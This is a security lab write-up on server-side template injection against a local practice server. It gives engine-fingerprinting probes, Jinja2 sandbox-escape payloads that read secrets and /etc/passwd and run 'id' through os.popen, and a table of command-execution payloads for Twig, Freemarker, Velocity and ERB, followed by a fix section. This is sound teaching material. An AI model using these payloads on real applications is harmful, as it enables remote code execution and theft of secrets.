# Lab 17 — Postcard

## The bug

```python
tpl = req.query.get("tpl", "Hello {{user.name}}!")
return js({"preview": render(tpl, {"user": User("guest")})})
```

The *template* comes from the request. Escaping the values inside it would have
been irrelevant: the value **is** the program. This happens whenever an
application lets users customise emails, invoices, dashboards, error pages,
or "personalised" anything — and whenever a developer writes
`render_template_string(f"Hello {name}")` instead of passing `name` as data.

## Step 1 — is it interpolation or evaluation?

The universal probe, in whatever the engine's delimiters are:

```
{{7*7}}     {{7*'7'}}     ${7*7}     #{7*7}     <%= 7*7 %>     {7*7}
```

```bash
h5i browser open 'http://127.0.0.1:9170/api/preview?tpl=hi' --session lab17 --new --capture
h5i websec replay req_0 --session lab17 --set 'query.tpl={{7*7}}'
```

`49` back means arithmetic happened on the server. `{{7*7}}` back means it is a
placeholder syntax and not an evaluator. `7777777` from `{{7*'7'}}` says Jinja2
or Twig (Python/PHP string repetition); an error says Java or a stricter
engine — the *difference* between the two probes fingerprints the engine.

| Response to `{{7*'7'}}` | Likely engine |
| --- | --- |
| `7777777` | Jinja2, Twig, Nunjucks |
| `49` | Freemarker, Velocity |
| error | Mako, ERB, Handlebars |

## Step 2 — climb out of the sandbox

```python
eval(m.group(1), {"__builtins__": {}}, env)
```

No builtins, so `open`, `__import__` and `eval` are gone. What remains is the
one object you were given — and in Python every object is a doorway:

```
user                      the object in scope
user.__init__             a function
user.__init__.__globals__ the module's global namespace  ← the whole file
```

```bash
h5i websec replay req_0 --session lab17 \
    --set 'query.tpl={{user.__init__.__globals__["VAULT_KEY"]}}'
```

That namespace contains every import the module made, so it is usually also the
route to code execution:

```
{{user.__init__.__globals__["__builtins__"]["open"]("/etc/passwd").read()}}
{{user.__init__.__globals__["sys"].modules["os"].popen("id").read()}}
```

When no object is in scope, start from a literal — every Python program has
those:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ().__class__.__base__.__subclasses__() }}
```

then index to a class whose `__init__.__globals__` carries `os` (historically
`warnings.catch_warnings`, `_frozen_importlib.BuiltinImporter`, or any
`subprocess.Popen`). Jinja2 adds shortcuts of its own —
`{{ cycler.__init__.__globals__.os.popen('id').read() }}`,
`{{ self._TemplateReference__context.cycler… }}`, `{{ lipsum.__globals__ }}`,
`{{ config.items() }}` in Flask.

## The ladder, for any language

The escape is always the same three moves:

1. **Reach a live object** — one in scope, or a literal.
2. **Climb to something the sandbox does not model** — its class, its module,
   its globals, its class hierarchy.
3. **Come back down to I/O** — file read, process spawn, or the config object.

| Engine | A first rung |
| --- | --- |
| Jinja2 / Flask | `{{ config }}`, `{{ cycler.__init__.__globals__ }}` |
| Twig (PHP) | `{{ _self.env.registerUndefinedFilterCallback("system") }}` |
| Freemarker | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| Velocity | `$class.inspect("java.lang.Runtime")` |
| ERB (Ruby) | `<%= system("id") %>` |
| Handlebars / Nunjucks | prototype walk to `require` |
| Go `text/template` | field access only — read secrets, rarely RCE |

## The fix

Templates are code. Never accept one from a user.

If users genuinely must customise output, give them a **logic-less** engine
(Mustache) with a fixed, explicitly-built context, and pass their text as a
*value*:

```python
render_template("greeting.html", name=name)     # not render_template_string(name)
```

Sandboxes (`jinja2.sandbox.SandboxedEnvironment`) are a hardening layer, not a
boundary — their bypass history is long, and this lab's `__builtins__: {}` is
exactly the kind of sandbox that looks sufficient and is not.

## h5i technique

Nothing new — but note that a payload full of `{`, `}`, `'` and `.` goes through
`--set` untouched. Shell-quote it and read `websec show req_N --raw` if a
payload ever behaves as though something rewrote it.
